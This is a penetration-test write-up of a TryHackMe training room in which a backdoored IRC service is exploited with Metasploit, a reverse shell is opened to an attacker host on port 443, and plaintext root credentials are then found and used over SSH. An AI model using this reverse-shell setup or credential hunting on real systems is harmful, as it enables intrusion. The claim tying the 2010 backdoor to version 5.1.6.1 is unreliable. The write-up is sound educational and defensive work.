# Infrastructure-Penetration-Test-Writeup
This writeup documents a guided penetration test performed against an intentionally vulnerable training host. All testing was conducted in an isolated, authorized lab environment provided by TryHackMe. No real systems, organizations, or individuals were targeted. Credentials and flag values have been redacted.



**Platform:** TryHackMe — *Guided Pentest: Infrastructure*
**Target:** Single Linux host (IRC + SSH services)
**Type:** Black-box infrastructure penetration test (training environment)
**Date:** March 2026



## Executive Summary

This engagement targeted a single Linux host exposing SSH and an outdated IRC service. Enumeration identified a specific, exploitable version of UnrealIRCd (5.1.6.1) — a version publicly known to have shipped with a planted backdoor in its distributed source code. Exploiting this backdoor provided immediate unauthenticated remote code execution. Post-exploitation filesystem enumeration uncovered a plaintext file containing root credentials, which were used to authenticate directly over SSH, resulting in full administrative compromise of the host.

This engagement highlights the risk of running outdated, unmaintained services with known historical compromises, as well as the common but critical mistake of storing credentials in plaintext on disk.

**Overall Risk: Critical**

---

## Scope & Objective

- **Target:** Single host (IP redacted/variable per lab instance)
- **Objective:** Identify exploitable services, obtain a foothold, escalate to full administrative (root) access
- **Authorization:** Testing was conducted solely within TryHackMe's sanctioned lab environment

---

## Methodology

1. Network reconnaissance (port and service scanning)
2. Service version fingerprinting
3. Public exploit research against identified versions
4. Exploitation via Metasploit Framework
5. Post-exploitation enumeration
6. Credential discovery and privilege escalation to root

---

## Findings

### 1. Outdated / Backdoored Service — UnrealIRCd 5.1.6.1 Remote Code Execution

**Severity:** Critical

An initial Nmap scan identified two open ports:

```bash
nmap -sV -sC -oN scan.txt MACHINE_IP
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
8889/tcp open  irc     UnrealIRCd
| irc-info:
|_  version: Unreal5.1.6.1
```

The IRC service's version banner (`Unreal5.1.6.1`) matched a version associated with a well-known historical incident: in 2010, UnrealIRCd's official distribution archive was compromised, and a backdoor was planted directly in the source code prior to packaging. Any deployment built from that compromised archive silently includes attacker-controlled command execution over its normal IRC listener port, requiring no authentication and no valid IRC session.

**Exploitation:**

A matching module was identified and used in Metasploit:

```
msf > search unrealircd
exploit/unix/irc/unreal_ircd_5161_backdoor
```

```
use 0
set RHOSTS MACHINE_IP
show payloads
set payload cmd/unix/reverse
set LHOST CONNECTION_IP
set LPORT 443
exploit
```

- `RPORT` defaulted correctly to `8889`, matching the Nmap scan.
- `cmd/unix/reverse` was selected over a more feature-rich payload (e.g., Meterpreter) due to limited prior knowledge of the target's architecture and installed libraries — a generic shell payload has minimal dependencies and is more likely to succeed on an unknown system.
- `LPORT 443` was deliberately chosen to blend outbound traffic with normal HTTPS activity rather than using an unusual port.

**Result:**

```
[*] Command shell session 1 opened (CONNECTION_IP:443 -> MACHINE_IP:53836)

whoami
webmaster
```

Remote code execution was achieved as the `webmaster` user, with no credentials or prior access required.

**How it works:** The backdoored UnrealIRCd binary inspects incoming connection data on its listener port for a specific two-byte marker. Data following that marker is passed directly to the operating system shell for execution, bypassing all normal IRC protocol handling and authentication. This is functionally identical to an unsanitized `shell_exec()` call — the same vulnerability class seen in the companion web application engagement — except compiled into the service binary itself rather than exposed through an HTTP parameter.

**Remediation:**
- Do not run end-of-life or unmaintained IRC software in production
- Verify the integrity of third-party software via checksums/signatures before deployment, especially for software with a history of supply-chain compromise
- Restrict or firewall off legacy/unnecessary services (IRC) from direct exposure
- Monitor for and patch against publicly known CVEs tied to installed software versions

---

### 2. Plaintext Credential Storage → Privilege Escalation to Root

**Severity:** Critical

With a foothold established as `webmaster`, filesystem enumeration was performed to search for credentials or other sensitive material:

```bash
find / -name password* 2>/dev/null
```

Among numerous irrelevant system/package files, one result stood out:

```
/etc/password.txt
```

This was not a standard system file (unlike `/etc/passwd`), and reading it revealed plaintext root credentials:

```bash
cat /etc/password.txt
```

**Exploitation:**

Since the initial shell was a non-interactive command shell (not a full TTY), `su` could not be used to prompt for and accept the password securely. Instead, the discovered credentials were used to authenticate directly via SSH, a service already identified as open during initial reconnaissance:

```bash
ssh root@MACHINE_IP
```

Authenticating with the recovered password granted a fully interactive root session, confirmed by reading the final flag at `/root/flag.txt`.

**Remediation:**
- Never store credentials in plaintext files on disk, anywhere in the filesystem
- Use a secrets manager or environment-based secrets injection for any credentials required by applications or scripts
- Apply the principle of least privilege — a compromised low-privilege service account should not lead directly to root credentials being readily accessible
- Enforce SSH key-based authentication and disable root login over SSH (`PermitRootLogin no`) as a defense-in-depth measure, which would have prevented this specific escalation path even with the password exposed

---

## Attack Chain Summary

```
Nmap scan (SSH + outdated IRC identified)
        │
        ▼
UnrealIRCd 5.1.6.1 version fingerprinted
        │
        ▼
Known backdoor exploited via Metasploit (unauthenticated RCE)
        │
        ▼
Foothold as "webmaster" (reverse shell)
        │
        ▼
Filesystem enumeration (find for password-related files)
        │
        ▼
Plaintext root credentials found in /etc/password.txt
        │
        ▼
SSH authentication as root using recovered credentials
        │
        ▼
Full administrative compromise — flag retrieved
```

As with the companion web application engagement, no single flaw required advanced technique — the risk came from an outdated, compromised-at-the-source service combined with poor credential hygiene once inside.

---

## Remediation Summary

| Finding | Priority | Recommendation |
|---|---|---|
| Backdoored/outdated UnrealIRCd | Critical | Remove or update the service; verify software integrity before deployment |
| Unnecessary service exposure (IRC) | Medium | Firewall/restrict legacy services not required for business function |
| Plaintext credentials on disk | Critical | Eliminate plaintext secrets; use a secrets manager |
| Root login permitted over SSH | High | Disable `PermitRootLogin`; enforce key-based auth and least privilege |

---

## Lessons Learned

- **Version banners matter.** A single precise version string (`Unreal5.1.6.1`) was enough to immediately identify a critical, publicly documented backdoor — reinforcing why thorough service fingerprinting (`-sV -sC`) is one of the highest-value steps in any engagement.
- **Supply-chain compromises persist.** Software compromised at its source can remain exploitable on live systems for years after the original incident, if deployments are never updated.
- **Internal hygiene matters as much as perimeter defense.** The initial foothold here was low-privilege, but a simple filesystem search for a predictably named file (`password.txt`) led directly to full root compromise — demonstrating why defense-in-depth inside a network is just as important as preventing the initial breach.
- **Dumb shells still get the job done.** Even without a full interactive TTY, discovered credentials could be used through an alternate, already-open service (SSH) to achieve the same end goal.

---

## Tools Used

- `nmap` — port scanning, service/version fingerprinting
- Metasploit Framework (`msfconsole`) — exploit search, configuration, and execution
- `find` — post-exploitation filesystem enumeration
- `ssh` — credential-based privilege escalation

---

*This report was produced for educational purposes as part of the TryHackMe "Guided Pentest: Infrastructure" training room. Techniques described are intended for use only against systems you own or are explicitly authorized to test.*
